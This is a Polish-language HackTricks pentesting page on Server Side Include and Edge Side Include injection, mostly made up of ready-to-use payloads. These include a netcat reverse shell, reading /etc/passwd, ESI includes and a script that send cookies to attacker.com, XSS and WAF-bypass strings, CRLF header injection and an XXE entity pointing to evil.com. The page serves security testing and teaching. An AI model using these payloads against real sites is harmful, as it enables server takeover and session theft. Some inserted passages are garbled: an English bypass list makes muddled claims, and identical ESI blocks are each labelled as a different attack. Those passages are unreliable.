# Wstrzykiwanie kodu Server Side Inclusion/Edge Side Inclusion

<details>

<summary><strong>Dowiedz si, jak hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy **reklam swojej firmy w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) **i** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **repozytori贸w GitHub**.

</details>

## Podstawowe informacje o Server Side Inclusion

**(Wprowadzenie zaczerpnite z [dokumentacji Apache](https://httpd.apache.org/docs/current/howto/ssi.html))**

SSI (Server Side Includes) to dyrektywy, kt贸re s **umieszczane w stronach HTML i oceniane na serwerze** podczas ich udostpniania. Pozwalaj one **dodawa dynamicznie generowane treci** do istniejcej strony HTML, bez koniecznoci udostpniania caej strony za pomoc programu CGI lub innej technologii dynamicznej.\
Na przykad, mo偶na umieci dyrektyw w istniejcej stronie HTML, takiej jak:

`<!--#echo var="DATE_LOCAL" -->`

I, gdy strona jest udostpniana, ten fragment zostanie oceniony i zastpiony swoj wartoci:

`Wtorek, 15 stycznia 2013, 19:28:54 EST`

Decyzja, kiedy u偶ywa SSI, a kiedy caa strona powinna by generowana przez jaki program, zazwyczaj zale偶y od tego, ile treci na stronie jest statycznych, a ile musi by ponownie obliczanych za ka偶dym razem, gdy strona jest udostpniana. SSI jest doskonaym sposobem na dodawanie maych fragment贸w informacji, takich jak bie偶cy czas - jak pokazano powy偶ej. Ale jeli wikszo strony jest generowana w momencie jej udostpniania, nale偶y poszuka innych rozwiza.

Mo偶na wnioskowa o obecnoci SSI, jeli aplikacja internetowa u偶ywa plik贸w o rozszerzeniach \*\* `.shtml`, `.shtm` lub `.stm`\*\*, ale nie jest to jedyny przypadek.

Typowe wyra偶enie SSI ma nastpujcy format:
```
<!--#directive param="value" -->
```
### Sprawdzenie

Aby sprawdzi podatno na wstrzyknicie zawartoci po stronie serwera (SSI/ESI), wykonaj nastpujce kroki:

1. **Zidentyfikuj punkt wstrzyknicia**: Przegldaj kod 藕r贸dowy aplikacji internetowej w poszukiwaniu miejsc, w kt贸rych u偶ytkownik mo偶e wprowadza dane, kt贸re s nastpnie wykorzystywane do generowania dynamicznej zawartoci strony. Mo偶e to obejmowa parametry URL, formularze, pliki cookie, nag贸wki HTTP itp.

2. **Sprawd藕, czy mo偶na wstrzykn kod**: Spr贸buj wstrzykn kod SSI/ESI, dodajc odpowiednie znaczniki do danych wejciowych. Na przykad, w przypadku SSI, u偶yj `<!--#include virtual="file.txt" -->`, a w przypadku ESI, u偶yj `<esi:include src="file.txt" />`. Jeli kod zostanie wykonany i zawarto pliku zostanie wywietlona na stronie, oznacza to, 偶e aplikacja jest podatna na wstrzyknicie zawartoci po stronie serwera.

3. **Sprawd藕 dostpno plik贸w**: Jeli udao si wstrzykn kod, sprawd藕, czy mo偶na uzyska dostp do innych plik贸w na serwerze. Wypr贸buj r贸偶ne cie偶ki plik贸w, takie jak `/etc/passwd`, `/etc/shadow`, `/etc/hosts`, aby sprawdzi, czy mo偶na uzyska poufne informacje lub wykona atak na serwer.

4. **Sprawd藕 mo偶liwo wykonania kodu**: Jeli aplikacja wykonuje kod SSI/ESI z uprawnieniami systemowymi, spr贸buj wstrzykn kod, kt贸ry pozwoli na wykonanie dowolnego kodu na serwerze. Na przykad, w przypadku SSI, u偶yj `<!--#exec cmd="command" -->`, a w przypadku ESI, u偶yj `<esi:eval>command</esi:eval>`. Jeli kod zostanie wykonany i wynik zostanie wywietlony na stronie, oznacza to, 偶e aplikacja jest podatna na wykonanie kodu.

5. **Zgo znalezion podatno**: Jeli udao si znale藕 podatno na wstrzyknicie zawartoci po stronie serwera, zgo j odpowiedniej osobie lub zespoowi odpowiedzialnemu za bezpieczestwo aplikacji. Przedstaw dokadne informacje o podatnoci, wczajc w to kroki reprodukcji i dowody potwierdzajce jej istnienie.

Pamitaj, 偶e testowanie podatnoci na wstrzyknicie zawartoci po stronie serwera powinno by przeprowadzane tylko na legalnych i uprawnionych systemach, zgodnie z obowizujcymi przepisami i zgodnie z zasadami etycznego hakowania.
```javascript
// Document name
<!--#echo var="DOCUMENT_NAME" -->
// Date
<!--#echo var="DATE_LOCAL" -->

// File inclusion
<!--#include virtual="/index.html" -->
// Including files (same directory)
<!--#include file="file_to_include.html" -->
// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->
// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->
// Modification date of a file
<!--#flastmod file="index.html" -->

// Command exec
<!--#exec cmd="dir" -->
// Command exec
<!--#exec cmd="ls" -->
// Reverse shell
<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->

// Print all variables
<!--#printenv -->
// Setting variables
<!--#set var="name" value="Rich" -->

```
## Wczenie po stronie serwera

Istnieje problem z **buforowaniem informacji lub dynamicznych aplikacji**, poniewa偶 cz treci mo偶e ulec **zmianie** przed kolejnym pobraniem treci. Do tego celu su偶y **ESI**, kt贸ry wskazuje za pomoc tag贸w ESI **dynamiczn tre, kt贸ra musi zosta wygenerowana** przed wysaniem wersji buforowanej.\
Jeli **atakujcy** jest w stanie **wstrzykn tag ESI** do treci buforowanej, mo偶e on wtedy **wstrzykn dowoln tre** do dokumentu przed wysaniem go do u偶ytkownik贸w.

### Wykrywanie ESI

Nastpujcy **nag贸wek** w odpowiedzi serwera oznacza, 偶e serwer korzysta z ESI:
```
Surrogate-Control: content="ESI/1.0"
```
Jeli nie mo偶esz znale藕 tego nag贸wka, serwer **mo偶e i tak u偶ywa ESI**.\
Mo偶na r贸wnie偶 zastosowa **lepe podejcie do eksploatacji**, poniewa偶 偶danie powinno dotrze do serwera atakujcego:
```javascript
// Basic detection
hell<!--esi-->o
// If previous is reflected as "hello", it's vulnerable

// Blind detection
<esi:include src=http://attacker.com>

// XSS Exploitation Example
<esi:include src=http://attacker.com/XSSPAYLOAD.html>

// Cookie Stealer (bypass httpOnly flag)
<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>

// Introduce private local files (Not LFI per se)
<esi:include src="supersecret.txt">

// Valid for Akamai, sends debug information in the response
<esi:debug/>
```
### Wykorzystanie ESI

[GoSecure stworzy](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/) tabel, aby zrozumie mo偶liwe ataki, kt贸re mo偶emy przeprowadzi na r贸偶nym oprogramowaniu obsugujcym ESI, w zale偶noci od obsugiwanej funkcjonalnoci:

* **Includes**: Obsuguje dyrektyw `<esi:includes>`
* **Vars**: Obsuguje dyrektyw `<esi:vars>`. Przydatne do omijania filtr贸w XSS
* **Cookie**: Ciasteczka dokumentu s dostpne dla silnika ESI
* **Wymagane nag贸wki przekazywane w g贸r**: Aplikacje poredniczce nie bd przetwarza instrukcji ESI, dop贸ki aplikacja nadrzdna nie dostarczy nag贸wk贸w
* **Whitelist host贸w**: W tym przypadku, ESI includes s mo偶liwe tylko z dozwolonych serwer贸w, co umo偶liwia np. atak SSRF tylko na te hosty

|         **Oprogramowanie**         | **Includes** | **Vars** | **Cookies** | **Wymagane nag贸wki przekazywane w g贸r** | **Whitelist host贸w** |
| :--------------------------: | :----------: | :------: | :---------: | :---------------------------: | :----------------: |
|            Squid3            |      Tak     |    Tak   |     Tak     |              Tak              |         Nie         |
|         Varnish Cache        |      Tak     |    Nie    |      Nie     |              Tak              |         Tak        |
|            Fastly            |      Tak     |    Nie    |      Nie     |               Nie              |         Tak        |
| Akamai ESI Test Server (ETS) |      Tak     |    Tak   |     Tak     |               Nie              |         Nie         |
|          NodeJS esi          |      Tak     |    Tak   |     Tak     |               Nie              |         Nie         |
|         NodeJS nodesi        |      Tak     |    Nie    |      Nie     |               Nie              |      Opcjonalne      |

#### XSS

Nastpujca dyrektywa ESI zaaduje dowolny plik w odpowiedzi serwera.
```xml
<esi:include src=http://attacker.com/xss.html>
```
#### Ominicie ochrony klienta przed atakami XSS

To bypass client XSS protection, you can try the following techniques:

1. **HTML encoding**: Encode the malicious payload using HTML entities to bypass client-side XSS filters. For example, `<` can be encoded as `&lt;` and `>` as `&gt;`.

2. **JavaScript encoding**: Encode the payload using JavaScript functions like `encodeURIComponent()` or `escape()` to bypass client-side XSS filters. This will prevent the execution of the payload by the client's browser.

3. **Event handlers**: Use event handlers like `onmouseover` or `onerror` to trigger the execution of the payload. This can bypass client-side XSS filters that only look for specific HTML tags or attributes.

4. **DOM-based XSS**: Exploit vulnerabilities in the Document Object Model (DOM) to inject and execute malicious code. This can bypass client-side XSS filters that rely on parsing HTML tags and attributes.

5. **Polyglot payloads**: Craft payloads that can be interpreted as both JavaScript and HTML. This can bypass client-side XSS filters that only look for specific content types.

Remember to always test your bypass techniques thoroughly to ensure they work as intended.
```xml
x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>

Use <!--esi--> to bypass WAFs:
<scr<!--esi-->ipt>aler<!--esi-->t(1)</sc<!--esi-->ript>
<img+src=x+on<!--esi-->error=ale<!--esi-->rt(1)>
```
#### Kradzie偶 ciasteczka

* Zdalna kradzie偶 ciasteczka
```xml
<esi:include src=http://attacker.com/$(HTTP_COOKIE)>
<esi:include src="http://attacker.com/?cookie=$(HTTP_COOKIE{'JSESSIONID'})" />
```
* Kradnij ciasteczko HTTP\_ONLY za pomoc XSS, odbijajc je w odpowiedzi:

```html
<script>
    var img = new Image();
    img.src = "http://attacker.com/steal.php?cookie=" + document.cookie;
</script>
```

* Inject malicious code into a server-side include (SSI) vulnerable application:

```html
<!--#exec cmd="ls" -->
```

* Exploit a server-side include (SSI) injection vulnerability to execute arbitrary commands:

```html
<!--#exec cmd="cat /etc/passwd" -->
```

* Exploit a server-side include (SSI) injection vulnerability to include remote files:

```html
<!--#include virtual="http://attacker.com/malicious-file.txt" -->
```

* Exploit an edge-side include (ESI) injection vulnerability to include remote files:

```html
<esi:include src="http://attacker.com/malicious-file.txt" />
```

* Exploit an edge-side include (ESI) injection vulnerability to execute arbitrary commands:

```html
<esi:remove>
    <esi:comment text="HTTP/1.0 200 OK">
    <esi:include src="http://attacker.com/malicious-file.txt" />
</esi:remove>
```

* Exploit an edge-side include (ESI) injection vulnerability to perform server-side request forgery (SSRF):

```html
<esi:remove>
    <esi:comment text="HTTP/1.0 200 OK">
    <esi:include src="http://internal-server.com/secret-file.txt" />
</esi:remove>
```

* Exploit an edge-side include (ESI) injection vulnerability to perform remote code execution (RCE):

```html
<esi:remove>
    <esi:comment text="HTTP/1.0 200 OK">
    <esi:include src="http://attacker.com/malicious-file.txt" />
</esi:remove>
```

* Exploit an edge-side include (ESI) injection vulnerability to perform server-side template injection (SSTI):

```html
<esi:remove>
    <esi:comment text="HTTP/1.0 200 OK">
    <esi:include src="http://attacker.com/malicious-template.txt" />
</esi:remove>
```
```bash
# This will reflect the cookies in the response
<!--esi $(HTTP_COOKIE) -->
# Reflect XSS (you can put '"><svg/onload=prompt(1)>' URL encoded and the URL encode eveyrhitng to send it in the HTTP request)
<!--esi/$url_decode('"><svg/onload=prompt(1)>')/-->

# It's possible to put more complex JS code to steal cookies or perform actions
```
#### Prywatny lokalny plik

Nie myli z "Wczeniem lokalnego pliku":
```markup
<esi:include src="secret.txt">
```
#### CRLF

CRLF (Carriage Return Line Feed) to sekwencja znak贸w u偶ywana do oznaczania nowej linii w tekstowych plikach. Skada si z dw贸ch znak贸w: powrotu karetki (CR) i podawania linii (LF). W niekt贸rych przypadkach, takich jak ataki wstrzykiwania SSI (Server-Side Inclusion) i ESI (Edge-Side Inclusion), CRLF mo偶e by wykorzystywane do wykonania atak贸w wstrzykiwania kodu lub manipulacji zawartoci strony internetowej. Atakujcy mo偶e wstrzykn znaki CRLF w celu wprowadzenia niechcianych linii lub instrukcji do kodu 藕r贸dowego strony, co mo偶e prowadzi do r贸偶nych problem贸w bezpieczestwa, takich jak wycieki informacji, ataki XSS (Cross-Site Scripting) lub ataki CSRF (Cross-Site Request Forgery). Aby zabezpieczy aplikacje przed atakami CRLF Injection, nale偶y odpowiednio filtrowa i walidowa dane wejciowe, a tak偶e unika bezporedniego wstrzykiwania danych u偶ytkownika do kodu 藕r贸dowego strony.
```markup
<esi:include src="http://anything.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/"/>
```
#### Przekierowanie otwarte

Nastpujcy kod doda nag贸wek `Location` do odpowiedzi.
```bash
<!--esi $add_header('Location','http://attacker.com') -->
```
#### Dodaj nag贸wek

* Dodaj nag贸wek w wymuszonym 偶daniu
```xml
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345"/>
</esi:include>
```
* Dodaj nag贸wek w odpowiedzi (u偶yteczne do obejcia "Content-Type: text/json" w odpowiedzi z XSS)
```bash
<!--esi/$add_header('Content-Type','text/html')/-->

<!--esi/$(HTTP_COOKIE)/$add_header('Content-Type','text/html')/$url_decode($url_decode('"><svg/onload=prompt(1)>'))/-->

# Check the number of url_decode to know how many times you can URL encode the value
```
#### CRLF w dodawaniu nag贸wka (**CVE-2019-2438)**

Wady typu CRLF (Carriage Return Line Feed) mog wystpi, gdy aplikacja internetowa nieprawidowo obsuguje znaki powrotu karetki i nowej linii w nag贸wkach HTTP. W przypadku podatnoci CVE-2019-2438, atakujcy mo偶e wykorzysta ten bd, aby wstrzykn zoliwe nag贸wki i przeprowadzi ataki typu Server-Side Request Forgery (SSRF) lub Cross-Site Scripting (XSS).

Atakujcy mo偶e wykorzysta podatno CRLF, aby zmieni zawarto nag贸wka, tak jak User-Agent, Referer lub Set-Cookie. Mo偶e to prowadzi do r贸偶nych atak贸w, takich jak przekierowanie u偶ytkownika na zoliwe strony, kradzie偶 sesji lub wykonanie dowolnego kodu JavaScript na stronie.

Aby wykorzysta t podatno, atakujcy musi znale藕 miejsce, w kt贸rym aplikacja internetowa nieprawidowo obsuguje znaki CRLF w nag贸wkach HTTP. Nastpnie mo偶e wstrzykn zoliwe znaki, takie jak `%0d` i `%0a`, aby rozdzieli nag贸wki i wstrzykn wasne dane.

Aby zabezpieczy si przed atakami CRLF, nale偶y skrupulatnie sprawdza i filtrowa wszelkie dane wprowadzane przez u偶ytkownik贸w, kt贸re mog by wykorzystane do modyfikacji nag贸wk贸w HTTP. Wa偶ne jest r贸wnie偶 regularne aktualizowanie oprogramowania i bibliotek, aby unikn wykorzystania znanych podatnoci.
```xml
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345
Host: anotherhost.com"/>
</esi:include>
```
#### Debugowanie Akamai

To spowoduje wysanie informacji debugowania doczonych do odpowiedzi:
```xml
<esi:debug/>
```
### ESI + XSLT = XXE

Poprzez okrelenie wartoci `xslt` dla parametru _dca_, mo偶liwe jest uwzgldnienie ESI opartego na **`eXtensible Stylesheet Language Transformations (XSLT)`**. Wczenie powoduje pobranie plik贸w XML i XSLT przez serwujcego HTTP, przy czym ten drugi filtruje ten pierwszy. Takie pliki XML s podatne na ataki _XML External Entity (XXE)_, umo偶liwiajce atakujcym wykonanie atak贸w SSRF. Jednak u偶yteczno tego podejcia jest ograniczona, poniewa偶 ESI ju偶 su偶y jako wektor SSRF. Ze wzgldu na brak obsugi w bibliotece Xalan, zewntrzne DTD nie s przetwarzane, co uniemo偶liwia wydobycie lokalnych plik贸w.
```xml
<esi:include src="http://host/poc.xml" dca="xslt" stylesheet="http://host/poc.xsl" />
```
Plik XSLT:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "http://evil.com/file" >]>
<foo>&xxe;</foo>
```
Sprawd藕 stron XSLT:

{% content-ref url="xslt-server-side-injection-extensible-stylesheet-language-transformations.md" %}
[xslt-server-side-injection-extensible-stylesheet-language-transformations.md](xslt-server-side-injection-extensible-stylesheet-language-transformations.md)
{% endcontent-ref %}

### Odwoania

* [https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)
* [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)
* [https://academy.hackthebox.com/module/145/section/1304](https://academy.hackthebox.com/module/145/section/1304)
* [https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91](https://infosecwriteups.com/exploring-the-world-of-esi-injection-b86234e66f91)

## Lista wykrywania pr贸b siowych

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssi_esi.txt" %}

<details>

<summary><strong>Naucz si hakowa AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeli chcesz zobaczy **reklam swojej firmy w HackTricks** lub **pobra HackTricks w formacie PDF**, sprawd藕 [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobd藕 [**oficjalne gad偶ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzin PEASS**](https://opensea.io/collection/the-peass-family), nasz kolekcj ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel si swoimi sztuczkami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) **i** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **na GitHubie.**

</details>
